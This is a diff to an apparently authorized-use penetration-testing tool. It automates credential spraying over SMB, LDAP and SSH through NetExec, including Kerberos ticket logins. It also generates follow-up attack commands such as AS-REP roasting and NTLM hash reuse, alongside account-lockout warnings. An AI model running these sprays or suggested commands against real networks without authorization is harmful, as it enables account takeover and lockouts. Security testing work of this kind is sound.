+        while i < len(lines):
+            line = lines[i].rstrip()
+            stripped = line.lstrip()
+            if not stripped or stripped.startswith("#"):
+                out.append(line)
+                i += 1
+                continue
+            # Gather the full logical command, following \ continuations.
+            group = [line]
+            while group[-1].endswith("\\") and i + 1 < len(lines):
+                i += 1
+                group.append(lines[i].rstrip())
+            if any(cls._PLACEHOLDER_RE.search(g) for g in group):
+                out.extend(f"# {g}" for g in group)
+            else:
+                out.extend(group)
+            i += 1
+        return out
+
+    def sh_section(self, result: TargetResult) -> None:
+        """Flush-left commands with findings as # comments. No boxes, no
+        indentation, no colour — the point is that `--sh > next.sh` gives a
+        file you can read, edit and run without stripping anything out."""
+        ip = result.real_ip or result.target
+        wrote = False
+
+        if result.anon_smb:
+            print("\n# --- anonymous SMB ---")
+            for label, tmpl in ANON_SMB_COMMANDS:
+                print(f"# {label}")
+                for ln in self._sh_command(tmpl.format(ip=ip)):
+                    print(ln)
+            wrote = True
+
+        if result.anon_ldap:
+            print("\n# --- anonymous LDAP ---")
+            for u in result.anon_ldap_users:
+                desc = f"  # {u['description']}" if u.get("description") else ""
+                print(f"# user: {u['user']}{desc}")
+            if result.anon_ldap_users:
+                names = " ".join(q(u["user"]) for u in result.anon_ldap_users)
+                print(f"printf '%s\\n' {names} > users.txt")
+            print(f"nxc ldap {ip} -u '' -p '' --users")
+            wrote = True
+
+        seen: set[tuple] = set()
+        for s in sorted(result.successes, key=success_sort_key):
+            key = (s.protocol, s.auth_type, s.local_auth,
+                   s.domain.lower(), s.user.lower())
+            if key in seen:
+                continue
+            seen.add(key)
+            entries = build_suggestions(
+                s, ip, result.hostname, result.is_dc,
+                "" if s.local_auth else (result.domain or self.cfg.domain or ""))
+            if not entries:
+                continue
+            who = f"{s.domain}\\{s.user}" if s.domain else s.user
+            scope = " local" if s.local_auth else ""
+            auth = ("" if s.auth_type == AuthType.PASSWORD
+                    else f" {s.auth_type.value}")
+            adm = " ADMIN" if s.is_admin else ""
+            print(f"\n# --- {s.protocol.upper()}{auth}{scope} · {who}{adm} ---")
+            for label, cmd in entries:
+                print(f"# {label}")
+                for ln in self._sh_command(cmd):
+                    print(ln)
+            wrote = True
+
+        if not wrote:
+            print("# no valid credentials")
+
     def valid_section(self, result: TargetResult) -> None:
+        if self.sh:
+            self.sh_section(result)
+            return
         has_anything = (result.successes or result.guests
                         or result.anon_smb or result.anon_ldap)
         if not has_anything:
@@ -1246,11 +1632,7 @@ class Reporter:
 
         # 1) Universal: the credential set is the problem (every attempt failed
         #    by definition). Widening it beats re-spraying.
-        print(f"\n    {BOLD}Widen your creds — don't just re-spray:{RESET}")
-        print(f"        {DIM}# creds hide in: web logins & page source, readable{RESET}")
-        print(f"        {DIM}# FTP/NFS files, SNMP strings, config/backup files,{RESET}")
-        print(f"        {DIM}# and reuse across hosts. A hash that failed here may{RESET}")
-        print(f"        {DIM}# work elsewhere — feed it back in:{RESET}")
+        print(f"\n    {BOLD}Reuse creds elsewhere:{RESET}")
         print("        tomsploit -t <other-host> -u users.txt -H <ntlm-hash>")
 
         # 2) AD with no foothold — username list is usually the gap.
@@ -1366,6 +1748,13 @@ class Reporter:
         it never blocks the spray (warn-only)."""
         if not result.lockout_checked:
             return
+        # In --sh mode stdout is a shell script, but this is a safety alarm
+        # and must never be dropped — send it to stderr instead.
+        out = sys.stderr if self.sh else sys.stdout
+
+        def say(text: str) -> None:
+            print(text, file=out)
+
         th = result.lockout_threshold
         attempts, per_proto, n_protos = self._attempts_per_user(result)
         # Only worth spelling out when the multiplier is doing something;
@@ -1373,26 +1762,26 @@ class Reporter:
         breakdown = (f"; {per_proto} secret(s) × {n_protos} domain-auth protocol(s)"
                      if n_protos > 1 else "")
         if th is None:
-            print(f"  {DIM}🔒 Lockout policy not readable anonymously — spray "
-                  f"with care (threshold unknown, ~{attempts} bad logons/user "
-                  f"this run).{RESET}")
+            say(f"  {DIM}🔒 Lockout policy not readable anonymously — spray "
+                f"with care (threshold unknown, ~{attempts} bad logons/user "
+                f"this run).{RESET}")
             return
         if th == 0:
-            print(f"  {GREEN}🔓 Lockout threshold disabled (0) — safe to spray."
-                  f"{RESET}")
+            say(f"  {GREEN}🔓 Lockout threshold disabled (0) — safe to spray."
+                f"{RESET}")
             return
         win = f", resets after {result.lockout_window}" if result.lockout_window else ""
         sev = RED if attempts and attempts >= th else YELLOW
-        print(f"  {sev}{BOLD}🔒 ACCOUNT LOCKOUT RISK{RESET} {sev}— threshold "
-              f"{th} bad attempts{win}.{RESET}")
+        say(f"  {sev}{BOLD}🔒 ACCOUNT LOCKOUT RISK{RESET} {sev}— threshold "
+            f"{th} bad attempts{win}.{RESET}")
         if attempts and attempts >= th:
-            print(f"  {sev}   ~{attempts} secret(s)/user this run WILL lock "
-                  f"accounts{breakdown}. Trim secrets, use --paired, or cut "
-                  f"the protocol set: --protocols smb{RESET}")
+            say(f"  {sev}   ~{attempts} secret(s)/user this run WILL lock "
+                f"accounts{breakdown}. Trim secrets, use --paired, or cut "
+                f"the protocol set: --protocols smb{RESET}")
         elif attempts:
-            print(f"  {DIM}   ~{attempts} secret(s)/user this run (under the "
-                  f"threshold{breakdown}), but failed re-runs accumulate within the window."
-                  f"{RESET}")
+            say(f"  {DIM}   ~{attempts} secret(s)/user this run (under the "
+                f"threshold{breakdown}), but failed re-runs accumulate within "
+                f"the window.{RESET}")
 
     def _anon_smb(self, ip: str) -> None:
         print(f"\n  {CYAN}{BOLD}💡 Anonymous SMB — Suggested Next Steps{RESET}")
@@ -1423,7 +1812,11 @@ class Reporter:
                 names = ", ".join(u["user"] for u in no_desc)
                 print(f"    {DIM}Other users: {names}{RESET}\n")
             print(f"        {DIM}# save usernames for spraying / roasting{RESET}")
-            print(f"        echo '{chr(10).join(u['user'] for u in users)}' > users.txt")
+            # printf + per-name shlex.quote, NOT echo '<newline-joined>':
+            # a single apostrophe in a name (o'brien) closed the quote early
+            # and left the pasted command hanging on an unterminated string.
+            names = " ".join(q(u["user"]) for u in users)
+            print(f"        printf '%s\\n' {names} > users.txt")
             print()
             print(f"        {DIM}# AS-REP roast with NO creds (just usernames){RESET}")
             print(f"        impacket-GetNPUsers {dom}/ -dc-ip {ip} -request "
@@ -1526,7 +1919,7 @@ class Reporter:
 
     # ── run-level summaries ─
     def summary(self, results: list[TargetResult]) -> None:
-        if len(results) <= 1:
+        if self.sh or len(results) <= 1:
             return
         n_win = sum(1 for r in results
                     if r.successes or r.anon_smb or r.anon_ldap)
@@ -1778,9 +2171,18 @@ def expand_targets(specs: Iterable[str], max_hosts: int) -> list[str]:
     return out
 
 
+def _is_ip_literal(spec: str) -> bool:
+    """True for a bare IPv4/IPv6 address (as opposed to a hostname/FQDN)."""
+    try:
+        ipaddress.ip_address(spec.strip())
+        return True
+    except ValueError:
+        return False
+
+
 def parse_protocol_list(spec: str | None) -> list[str]:
     if not spec:
-        return list(ALL_PROTOCOLS)
+        return list(DEFAULT_PROTOCOLS)
     items = {s.strip().lower() for s in spec.split(",") if s.strip()}
     unknown = items - set(ALL_PROTOCOLS)
     if unknown:
@@ -1837,13 +2239,21 @@ def append_creds(path: str, result: TargetResult) -> None:
                 result.real_ip or result.target,
                 s.protocol, s.scope,
                 s.domain or "-", s.user,
-                s.auth_type.value, s.secret,
+                s.auth_type.value, s.secret or "(ccache)",
                 "admin" if s.is_admin else "user",
                 now,
             ]) + "\n")
 
 
 # ─── Orchestrator ──────────────────────────────────────────────────────
+
+@dataclass
+class _ProtoState:
+    """Shared, lock-guarded state for one (protocol, scope) across all the
+    credential attempts now running against it in parallel."""
+    timeouts: int = 0
+    aborted: bool = False
+
 
 class TomSploit:
     def __init__(self, cfg: Config, reporter: Reporter):
@@ -1864,6 +2274,10 @@ class TomSploit:
         self._progress_lock = threading.Lock()
         self._done = 0
         self._total = 0
+
+        # Per-(protocol, scope) timeout budget, shared across the parallel
+        # attempts now running against each one.
+        self._state_lock = threading.Lock()
 
         # Consolidated scan log (written once at the end). nxc is no longer
         # given --log: this nxc opens that path with mode "x" and crashes when
@@ -1965,9 +2379,12 @@ class TomSploit:
         sys.stderr.flush()
 
     def _say(self, msg: str) -> None:
+        # Under --sh stdout is a shell script, so live hits go to stderr —
+        # you still watch them scroll while `> next.sh` collects the commands.
+        stream = sys.stderr if self.cfg.sh_only else sys.stdout
         with self._progress_lock:
             self._clear_progress()
-            print(msg, flush=True)
+            print(msg, file=stream, flush=True)
             self._redraw()
 
     # ── subprocess wrapper ─
@@ -2062,113 +2479,139 @@ class TomSploit:
         cmd.extend(["--timeout", str(NETEXEC_TIMEOUT)])
         return cmd
 
-    # ── one (protocol, scope) task ─
-    def _scan_protocol(self, proto: str, target: str, local_auth: bool
-                       ) -> tuple[list[tuple[str, str]], list[Success], str]:
-        """Run every credential against (proto, local_auth) for one target.
-        Returns (status_lines, successes, target_info). Auth successes are
-        de-duplicated here so repeated nxc [+] lines don't multiply."""
+    # ── one (protocol, scope, credential) attempt ─
+    #
+    # The unit of parallelism used to be the (protocol, scope) PAIR, with every
+    # credential run serially inside it. That put the concurrency on the wrong
+    # axis: `--protocols smb` scheduled exactly two tasks, so 20 credentials
+    # became 20 sequential nxc spawns (~1.5s of interpreter startup each) while
+    # 13 of the 15 workers sat idle. Now each (protocol, scope, credential) is
+    # its own task, so the pool is actually used.
+    #
+    # NOTE this raises the RATE of bad logons, not the count — the lockout
+    # arithmetic in Reporter._attempts_per_user is unchanged — but a lockout
+    # window is wall-clock, so a tight threshold trips sooner. The pre-spray
+    # --pass-pol warning still fires first.
+
+    def _scan_attempt(self, proto: str, target: str, cred: Cred,
+                      local_auth: bool, state: "_ProtoState"
+                      ) -> tuple[str, list[tuple[str, str]], list[Success]]:
+        """One nxc invocation. Returns (protocol_key, lines, successes).
+
+        Always ticks exactly once, on every exit path, so the progress bar
+        can't drift or stall."""
+        key = f"{proto}-{'local' if local_auth else 'domain'}"
+        scope_label = "local" if local_auth else "domain"
         lines: list[tuple[str, str]] = []
         successes: list[Success] = []
         seen_keys: set[tuple] = set()
-        target_info = ""
-        consecutive_timeouts = 0
-        scope_label = "local" if local_auth else "domain"
 
-        # SSH is handled with the REAL ssh client, not nxc's SSH module —
-        # nxc's paramiko-based handler can disagree with OpenSSH on servers
-        # with non-standard auth, so we test what an actual login would do.
-        if proto == "ssh":
-            return self._scan_ssh(target)
-
-        for idx, cred in enumerate(self.creds):
-            if self._stop.is_set():
-                # account for what we are abandoning, or the bar freezes
-                # mid-run and the final figure never reaches the total
-                self._tick(len(self.creds) - idx)
-                break
-
-            # Skip auth methods this protocol can't use (e.g. hash vs ssh).
-            if (cred.is_hash or cred.is_kerberos) and proto not in WINDOWS_PROTOS:
-                self._tick(); continue
-
-            cmd = self._nxc_cmd(proto, target, cred, local_auth)
-            try:
-                stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
-            except InterruptedError:
-                break
-
-            if timed_out:
-                consecutive_timeouts += 1
-                self._tick()
-                if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
-                    lines.append(("[!]",
-                                  f"{MAX_CONSECUTIVE_TIMEOUTS} consecutive "
-                                  f"timeouts — skipped"))
-                    self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
-                              f"{DIM}consecutive timeouts — skipping{RESET}")
-                    # Tick the remaining attempts so the bar stays honest.
-                    self._tick(len(self.creds) - (idx + 1))
-                    break
-                continue
-            consecutive_timeouts = 0
-
-            for raw in stdout.split("\n"):
-                marker, msg = parse_nxc_line(raw.strip())
-                if marker == "[*]":
-                    # STORED as well as captured. The [*] line is the only
-                    # place nxc reports name:/domain:/signing:, and dropping
-                    # it here is what left SMB-signing (relay) detection and
-                    # the LDAP DC signal reading from an empty list.
-                    lines.append((marker, msg))
-                    if not target_info:
-                        target_info = msg
-                elif marker == "[+]":
-                    if not is_auth_success(msg, cred.user):
-                        # A [+] that isn't a clean auth success. Usually it's
-                        # benign module output ("Dumped 5 objects"), but it
-                        # could be a real success in a shape we don't parse
-                        # (nxc format drift, an unusual protocol response).
-                        # If it looks credential-ish, flag it for manual
-                        # review with [?] instead of silently treating it as
-                        # noise; otherwise show it plainly.
-                        if looks_like_possible_success(msg, cred.user):
-                            lines.append(("[?]", msg))
-                            self._say(f"  {YELLOW}{BOLD}? {proto.upper()} "
-                                      f"({scope_label}){RESET} {YELLOW}{msg}"
-                                      f"{RESET} {DIM}← verify manually{RESET}")
-                        else:
-                            lines.append((marker, msg))
-                        continue
-                    domain, user, secret, is_admin, is_guest = \
-                        parse_success_message(msg)
-                    if not secret:
-                        secret = cred.secret
-                        user = user or cred.user
-                    success = Success(
-                        protocol=proto, local_auth=local_auth,
-                        domain=domain, user=user, secret=secret,
-                        auth_type=cred.auth_type,
-                        is_admin=is_admin, is_guest=is_guest,
-                        raw_message=msg,
-                    )
-                    if success.dedup_key in seen_keys:
-                        continue
-                    seen_keys.add(success.dedup_key)
-                    lines.append((marker, msg))
-                    successes.append(success)
-                    color = YELLOW if is_guest else GREEN
-                    tag = " [Guest]" if is_guest else ""
-                    self._say(f"  {color}{BOLD}⚡ {proto.upper()} "
-                              f"({scope_label}){RESET} {color}{msg}{tag}{RESET}")
-                elif marker in ("[-]", "[!]"):
-                    lines.append((marker, msg))
-
-            for raw in self._stderr_fallback(stdout, stderr):
-                lines.append(("[-]", raw))
-
+        if self._stop.is_set():
             self._tick()
-        return lines, successes, target_info
+            return key, lines, successes
+
+        # This (protocol, scope) already gave up after repeated timeouts;
+        # don't spend another 45s proving it again.
+        with self._state_lock:
+            if state.aborted:
+                self._tick()
+                return key, lines, successes
+
+        cmd = self._nxc_cmd(proto, target, cred, local_auth)
+        try:
+            stdout, stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
+        except InterruptedError:
+            self._tick()
+            return key, lines, successes
+
+        if timed_out:
+            self._tick()
+            # "Consecutive" no longer means anything once attempts run in
+            # parallel, so this is now simply a per-(protocol, scope) budget:
+            # after N timeouts, stop scheduling more against it. Attempts
+            # already in flight finish; the queued ones short-circuit above.
+            with self._state_lock:
+                state.timeouts += 1
+                just_aborted = (state.timeouts >= MAX_CONSECUTIVE_TIMEOUTS
+                                and not state.aborted)
+                if just_aborted:
+                    state.aborted = True
+            if just_aborted:
+                lines.append(("[!]", f"{MAX_CONSECUTIVE_TIMEOUTS} timeouts — "
+                                     f"remaining attempts skipped"))
+                self._say(f"  {YELLOW}⏱ {proto.upper()} ({scope_label}){RESET} "
+                          f"{DIM}repeated timeouts — skipping{RESET}")
+            return key, lines, successes
+
+        for raw in stdout.split("\n"):
+            marker, msg = parse_nxc_line(raw.strip())
+            if marker == "[*]":
+                # STORED as well as captured. The [*] line is the only
+                # place nxc reports name:/domain:/signing:, and dropping
+                # it here is what left SMB-signing (relay) detection and
+                # the LDAP DC signal reading from an empty list.
+                lines.append((marker, msg))
+            elif marker == "[+]":
+                # Kerberos successes carry no secret, so the strict colon
+                # rule has to be relaxed for them (and ONLY for them).
+                if not is_auth_success(msg, cred.user,
+                                       allow_secretless=cred.is_kerberos):
+                    # A [+] that isn't a clean auth success. Usually it's
+                    # benign module output ("Dumped 5 objects"), but it
+                    # could be a real success in a shape we don't parse
+                    # (nxc format drift, an unusual protocol response).
+                    # If it looks credential-ish, flag it for manual
+                    # review with [?] instead of silently treating it as
+                    # noise; otherwise show it plainly.
+                    if looks_like_possible_success(msg, cred.user):
+                        lines.append(("[?]", msg))
+                        self._say(f"  {YELLOW}{BOLD}? {proto.upper()} "
+                                  f"({scope_label}){RESET} {YELLOW}{msg}"
+                                  f"{RESET} {DIM}← verify manually{RESET}")
+                    else:
+                        lines.append((marker, msg))
+                    continue
+                domain, user, secret, is_admin, is_guest = \
+                    parse_success_message(msg)
+                user = user or cred.user
+                if not secret:
+                    # Kerberos legitimately has no secret (the ccache IS the
+                    # credential); for password/hash this backfills a shape
+                    # we didn't fully parse.
+                    secret = cred.secret
+                success = Success(
+                    protocol=proto, local_auth=local_auth,
+                    domain=domain, user=user, secret=secret,
+                    auth_type=cred.auth_type,
+                    is_admin=is_admin, is_guest=is_guest,
+                    raw_message=msg,
+                )
+                if success.dedup_key in seen_keys:
+                    continue
+                seen_keys.add(success.dedup_key)
+                lines.append((marker, msg))
+                successes.append(success)
+                color = YELLOW if is_guest else GREEN
+                tag = " [Guest]" if is_guest else ""
+                self._say(f"  {color}{BOLD}⚡ {proto.upper()} "
+                          f"({scope_label}){RESET} {color}{msg}{tag}{RESET}")
+            elif marker in ("[-]", "[!]"):
+                lines.append((marker, msg))
+
+        for raw in self._stderr_fallback(stdout, stderr):
+            lines.append(("[-]", raw))
+
+        self._tick()
+        return key, lines, successes
+
+    def _scan_ssh_task(self, target: str
+                       ) -> tuple[str, list[tuple[str, str]], list[Success]]:
+        """SSH stays ONE task rather than one-per-credential: it carries
+        sequential state across attempts (the legacy-algorithm flip, the
+        one-shot 'sshpass missing' warning) that would race if split up.
+        Adapts _scan_ssh's return shape to match _scan_attempt's."""
+        lines, successes, _tinfo = self._scan_ssh(target)
+        return "ssh-domain", lines, successes
 
     # ── SSH via the real ssh client (not nxc's module) ─
     _SSH_MARKER = "TOMSPLOIT_SSH_OK"
@@ -2205,9 +2648,17 @@ class TomSploit:
                 self._tick(len(self.creds) - idx)
                 break
 
-            # Real-ssh path tests passwords (nxc's SSH module did the same).
-            # Hash/kerberos creds aren't SSH-applicable — skip and tick.
-            if cred.is_hash or cred.is_kerberos:
+            # A hash genuinely can't authenticate to OpenSSH — skip it.
+            if cred.is_hash:
+                self._tick(); continue
+
+            # Kerberos: authenticate with the ticket cache via GSSAPI, no
+            # password and no sshpass. This is the AD-joined-Linux path
+            # (sshd with GSSAPIAuthentication yes) — the ticket in $KRB5CCNAME
+            # is the credential.
+            if cred.is_kerberos:
+                self._scan_ssh_gssapi(target, cred, lines, successes,
+                                      seen_keys)
                 self._tick(); continue
 
             if not have_sshpass:
@@ -2287,6 +2738,139 @@ class TomSploit:
 
             self._tick()
         return lines, successes, target_info
+
+    def _scan_ssh_gssapi(self, target: str, cred: "Cred",
+                         lines: list, successes: list,
+                         seen_keys: set) -> None:
+        """Attempt an SSH login with a Kerberos ticket (GSSAPI), for
+        AD-joined Linux hosts running `GSSAPIAuthentication yes`.
+
+        No password, no sshpass — the credential is the TGT in $KRB5CCNAME,
+        exactly the cache -k already relies on for the nxc protocols. Success
+        is proven the same way the password path proves it: the marker must
+        come back on stdout, so a banner or a prompt can't read as a shell.
+
+        Requires a ticket cache to exist; if KRB5CCNAME is unset and no
+        default cache is present, ssh has nothing to present and the attempt
+        fails cleanly with a one-line explanation rather than a false negative.
+        """
+        # A principal is needed for the SSH username. Prefer the cred's user;
+        # if it carries a realm (user@REALM) keep only the shortname for the
+        # -l login name, since the realm belongs to Kerberos, not the OS user.
+        login = cred.user.split("@", 1)[0] if cred.user else cred.user
+        if not login:
+            lines.append(("[!]", "kerberos SSH: no username to log in as"))
+            return
+
+        # Confirm a ticket cache actually exists before spending a connection
+        # on it. klist -s is silent and returns non-zero when there are no
+        # valid tickets; if klist isn't installed we fall through and let ssh
+        # try, so a missing klist never blocks a working setup.
+        if shutil.which("klist"):
+            try:
+                rc = subprocess.run(["klist", "-s"], stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL,
+                                    stdin=subprocess.DEVNULL, timeout=5).returncode
+            except (OSError, subprocess.SubprocessError):
+                rc = 0   # klist misbehaved — don't block, let ssh decide
+            if rc != 0:
+                lines.append(("[!]", f"{login} (kerberos) — no valid ticket in "
+                              f"cache (run kinit; check KRB5CCNAME)"))
+                return
+
+        cmd = self._ssh_gssapi_cmd(target, login)
+        # Pass the caller's environment through so $KRB5CCNAME (and any custom
+        # cache path the operator exported) reaches ssh unchanged.
+        try:
+            stdout, stderr, timed_out = self._run_proc(
+                cmd, SUBPROCESS_TIMEOUT, env=dict(os.environ))
+        except InterruptedError:
+            return
+
+        combined = f"{stdout}\n{stderr}"
+        if self.cfg.debug:
+            self._say(f"  {DIM}[ssh -k debug] {' '.join(cmd[1:])}{RESET}")
+            self._say(f"  {DIM}[ssh -k debug] out={stdout!r} err={stderr!r}{RESET}")
+
+        if timed_out:
+            lines.append(("[-]", f"{login} (kerberos) — connection timed out"))
+            return
+
+        if self._SSH_MARKER in stdout:
+            success = Success(
+                protocol="ssh", local_auth=False, domain="",
+                user=login, secret="", auth_type=AuthType.KERBEROS,
+                is_admin=False, is_guest=False,
+                raw_message=f"{login} (kerberos GSSAPI login OK)")
+            if success.dedup_key not in seen_keys:
+                seen_keys.add(success.dedup_key)
+                lines.append(("[+]", success.raw_message))
+                successes.append(success)
+                self._say(f"  {GREEN}{BOLD}⚡ SSH{RESET} {GREEN}{login} "
+                          f"(kerberos ticket){RESET}")
+            return
+
+        # No marker → distinguish "no ticket" / "server refused GSSAPI" /
+        # "connection problem" so the line is actionable, not just "failed".
+        low = combined.lower()
+        # Ticket/credential problems (as opposed to the host rejecting a valid
+        # ticket). Explicit phrases only — no bare "gss"+"no " heuristic, which
+        # both mis-grouped by operator precedence and matched unrelated lines.
+        ticket_signals = (
+            "no credentials cache", "credentials cache file",
+            "no kerberos credentials", "no credentials available",
+            "can't find client principal", "server not found in kerberos",
+            "clock skew", "ticket expired", "credential expired",
+        )
+        if any(sig in low for sig in ticket_signals):
+            lines.append(("[!]", f"{login} (kerberos) — ticket problem "
+                          f"(run kinit; check KRB5CCNAME / clock skew)"))
+        elif self._ssh_is_conn_error(combined):
+            lines.append(("[-]", f"{login} (kerberos) — "
+                          f"{self._ssh_conn_reason(combined)}"))
+        elif ("permission denied" in low or "authentications that can continue"
+              in low):
+            # Reached sshd; GSSAPI was offered/attempted and rejected. Usually
+            # means the host isn't accepting this principal, or GSSAPI is off.
+            lines.append(("[-]", f"{login} (kerberos) — GSSAPI rejected "
+                          f"(host may not accept this principal, or "
+                          f"GSSAPIAuthentication is off)"))
+        else:
+            lines.append(("[-]", f"{login} (kerberos) — auth failed"))
+
+    @staticmethod
+    def _ssh_gssapi_cmd(target: str, login: str) -> list[str]:
+        """ssh invocation for Kerberos/GSSAPI auth. No sshpass: the ticket in
+        the cache is the credential. Restricts auth to gssapi-with-mic so a
+        host that also offers passwords can't turn this into a hanging
+        password prompt, and runs the marker so success means a real shell.
+
+        No credential delegation: this only proves the ticket authenticates,
+        so it never forwards the TGT to the target."""
+        marker = TomSploit._SSH_MARKER
+        return [
+            "ssh",
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null",
+            "-o", "GlobalKnownHostsFile=/dev/null",
+            "-o", "ConnectTimeout=10",
+            "-o", "GSSAPIAuthentication=yes",
+            # Deliberately NOT delegating (no -K / GSSAPIDelegateCredentials).
+            # This is a validation probe: forwarding the TGT onto the target
+            # would leave your ticket harvestable there if the host is logging
+            # or compromised, for no benefit — we only need to prove auth works.
+            "-o", "GSSAPIDelegateCredentials=no",
+            # gssapi-keyex first (key-exchange GSSAPI, used by some ADs),
+            # then gssapi-with-mic; NOTHING else, so no password fallback.
+            "-o", "PreferredAuthentications=gssapi-keyex,gssapi-with-mic",
+            "-o", "PubkeyAuthentication=no",
+            "-o", "PasswordAuthentication=no",
+            "-o", "KbdInteractiveAuthentication=no",
+            "-o", "BatchMode=yes",
+            "-o", "LogLevel=ERROR",
+            f"{login}@{target}",
+            f"echo {marker}",
+        ]
 
     # Legacy algorithm options, appended on a negotiation-failure retry so an
     # old SSH server (only offering ssh-rsa host keys / SHA-1 KEX / CBC ciphers,
@@ -2368,6 +2952,56 @@ class TomSploit:
                 or "kex_exchange" in t):     return "ssh algorithm negotiation failed"
         if "connection timed out" in t:      return "connection timed out"
         return "connection error"
+
+    # ── Kerberos needs a NAME, not an IP ─
+    def _resolve_kerberos_target(self, result: TargetResult) -> None:
+        """Kerberos authenticates to a SERVICE PRINCIPAL (cifs/host.domain),
+        so nxc must be handed a name it can build an SPN from. Given a bare
+        IP, every -k attempt fails with KRB5_CC_NOTFOUND / a principal-unknown
+        error that looks like bad credentials but isn't.
+
+        Best-effort: grab nxc's unauthenticated SMB info line, build
+        `name.domain` from it, and use that as the nxc target for this host.
+        The IP is still what we report and what the suggestions use.
+
+        Falls back to a warning rather than blocking — if the operator has
+        already put the FQDN in /etc/hosts and passed it as the target, none
+        of this runs."""
+        if not self.cfg.kerberos:
+            return
+        result.nxc_target = result.target
+        if not _is_ip_literal(result.target):
+            return
+
+        cmd = ["nxc", "smb", result.target, "-u", "", "-p", "",
+               "--timeout", str(NETEXEC_TIMEOUT)]
+        info = ""
+        try:
+            stdout, _stderr, timed_out = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
+        except InterruptedError:
+            return
+        if not timed_out:
+            for raw in stdout.split("\n"):
+                marker, msg = parse_nxc_line(raw.strip())
+                if marker == "[*]" and ("name:" in msg or "domain:" in msg):
+                    info = msg
+                    break
+
+        host = extract_hostname(info)
+        domain = extract_domain(info) or self.cfg.domain
+        if host and domain and domain.upper() != "WORKGROUP":
+            fqdn = f"{host}.{domain}"
+            result.nxc_target = fqdn
+            self._say(f"  {DIM}🎫 Kerberos: using {fqdn} instead of "
+                      f"{result.target} (an SPN needs a name){RESET}")
+            self._say(f"  {DIM}   if this fails to resolve:  echo "
+                      f"'{result.target} {fqdn} {host}' | sudo tee -a "
+                      f"/etc/hosts{RESET}")
+        else:
+            self._say(f"  {YELLOW}⚠ Kerberos against a bare IP{RESET} "
+                      f"{DIM}— an SPN needs a hostname, so these attempts will "
+                      f"likely fail. Add the DC's FQDN to /etc/hosts and pass "
+                      f"that as -t.{RESET}")
 
     # ── anonymous SMB probe ─
     def _lockout_precheck(self, result: TargetResult) -> None:
@@ -2519,22 +3153,42 @@ class TomSploit:
         """Run all protocol + anonymous scans for an already-probed target,
         filling `result` in place."""
         open_protos = result.open_protocols
+        target = result.nxc_target or result.target
 
-        tasks: list[tuple[str, bool]] = []
+        # Build the flat attempt list: one nxc spawn per
+        # (protocol, scope, credential). Credentials a protocol simply can't
+        # use are filtered out HERE rather than skipped at run time, so the
+        # progress total reflects work that will actually happen.
+        attempts: list[tuple[str, bool, Cred]] = []
+        ssh_scheduled = False
+        states: dict[str, _ProtoState] = {}
         for proto in open_protos:
-            tasks.append((proto, False))
+            scopes = [False]
             if proto in LOCAL_AUTH_PROTOCOLS and not self.cfg.kerberos:
-                tasks.append((proto, True))
+                scopes.append(True)
+            for scope in scopes:
+                key = f"{proto}-{'local' if scope else 'domain'}"
+                states.setdefault(key, _ProtoState())
+                if proto == "ssh":
+                    # SSH is handled with the REAL ssh client, not nxc's
+                    # module — nxc's paramiko handler can disagree with
+                    # OpenSSH on servers with non-standard auth.
+                    ssh_scheduled = True
+                    continue
+                for cred in self.creds:
+                    if (cred.is_hash or cred.is_kerberos) and proto not in WINDOWS_PROTOS:
+                        continue
+                    attempts.append((proto, scope, cred))
 
         with self._progress_lock:
             self._done = 0
-            self._total = len(tasks) * len(self.creds)
+            # _scan_attempt ticks once; _scan_ssh ticks once per credential.
+            self._total = len(attempts) + (len(self.creds) if ssh_scheduled else 0)
             self._redraw()
 
         start = time.time()
         anon_lines: list[str] = []
         anon_success = False
-        target = result.target
         seen_target_keys: set[tuple] = set()
 
         with ThreadPoolExecutor(max_workers=max(2, self.cfg.workers)) as pool:
@@ -2545,25 +3199,40 @@ class TomSploit:
                                 if "ldap" in open_protos and not self.cfg.kerberos
                                 else None)
 
-            future_to_task = {
-                pool.submit(self._scan_protocol, proto, target, scope): (proto, scope)
-                for proto, scope in tasks
-            }
-            for fut in as_completed(future_to_task):
+            # Ordered list, not a dict + as_completed: results are collected
+            # in submission order so a protocol block reads the same way on
+            # every run. Wall time is identical — we need every result before
+            # anything renders — and live ⚡ hit lines still print the moment
+            # they land, from the worker.
+            futures: list[tuple[str, object]] = []
+            if ssh_scheduled:
+                futures.append(("ssh-domain",
+                                pool.submit(self._scan_ssh_task, target)))
+            for proto, scope, cred in attempts:
+                key = f"{proto}-{'local' if scope else 'domain'}"
+                futures.append((key, pool.submit(
+                    self._scan_attempt, proto, target, cred, scope, states[key])))
+
+            for fallback_key, fut in futures:
                 if self._stop.is_set():
                     break
-                proto, scope = future_to_task[fut]
-                key = f"{proto}-{'local' if scope else 'domain'}"
                 try:
-                    lines, successes, tinfo = fut.result()
+                    key, lines, successes = fut.result()
                 except Exception as exc:
-                    lines, successes, tinfo = [("[!]", f"Task error: {exc}")], [], ""
+                    key = fallback_key
+                    lines, successes = [("[!]", f"Task error: {exc}")], []
                     if self.cfg.debug:
                         import traceback; traceback.print_exc()
-                result.protocol_lines[key] = lines
-                if tinfo and not result.target_info:
-                    result.target_info = tinfo
-                # Dedup once more at the target level (belt and suspenders).
+                # extend, not assign: many attempts now feed the same key.
+                result.protocol_lines.setdefault(key, []).extend(lines)
+                if not result.target_info:
+                    for marker, msg in lines:
+                        if marker == "[*]":
+                            result.target_info = msg
+                            break
+                # Dedup at the target level — the same credential succeeding
+                # on the same protocol is one finding, however many nxc
+                # invocations reported it.
                 for s in successes:
                     if s.dedup_key in seen_target_keys:
                         continue
@@ -2604,7 +3273,13 @@ class TomSploit:
         #  - LDAP port open (member servers don't answer LDAP)
         #  - an LDAP [*] info line came back (LDAP actually responded)
         #  - any nxc line explicitly naming the DC role
-        ldap_open = "ldap" in result.open_protocols
+        # Only a REAL probe result counts as evidence. Under --no-port-probe
+        # open_protocols is just the requested list, so "ldap is open" was
+        # true for every host; combined with an operator-supplied -d (which
+        # satisfies the domain half of the test) that flagged every single
+        # target as a DC, handed it the DC-only suggestion set, and printed a
+        # bogus Domain Controllers section. Fall back to actual LDAP output.
+        ldap_open = result.probed and "ldap" in result.open_protocols
         ldap_info = ""
